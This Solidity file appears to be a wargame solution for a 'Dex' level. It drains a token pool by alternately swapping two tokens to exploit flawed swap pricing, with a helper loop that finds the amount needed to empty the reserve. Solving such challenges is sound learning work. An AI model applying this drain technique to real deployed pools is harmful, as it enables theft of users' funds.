// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IDex.sol";

contract SolveLevel22 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x36E92B2751F260D6a4749d7CA58247E7f8198284;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IDex instance = IDex(instanceAddress);

        instance.approve(address(instance), 110);

        address fromToken = instance.token1();
        address toToken = instance.token2();

        uint256 numTokensToSwap;
        while (
            instance.balanceOf(fromToken, address(instance)) > 0 &&
            instance.balanceOf(toToken, address(instance)) > 0
        ) {
            (fromToken, toToken) = (toToken, fromToken);
            numTokensToSwap = getNumTokensToDrainDex(
                instance,
                fromToken,
                toToken
            );
            if (numTokensToSwap > instance.balanceOf(fromToken, player)) {
                numTokensToSwap = instance.balanceOf(fromToken, player);
            }
            instance.swap(fromToken, toToken, numTokensToSwap);
        }
    }

    function getNumTokensToDrainDex(
        IDex instance,
        address fromToken,
        address toToken
    ) public returns (uint256 numTokensToDrainDex) {
        numTokensToDrainDex = 0;
        while (
            instance.getSwapPrice(fromToken, toToken, numTokensToDrainDex) <
            instance.balanceOf(toToken, address(instance))
        ) {
            numTokensToDrainDex++;
        }
    }
}
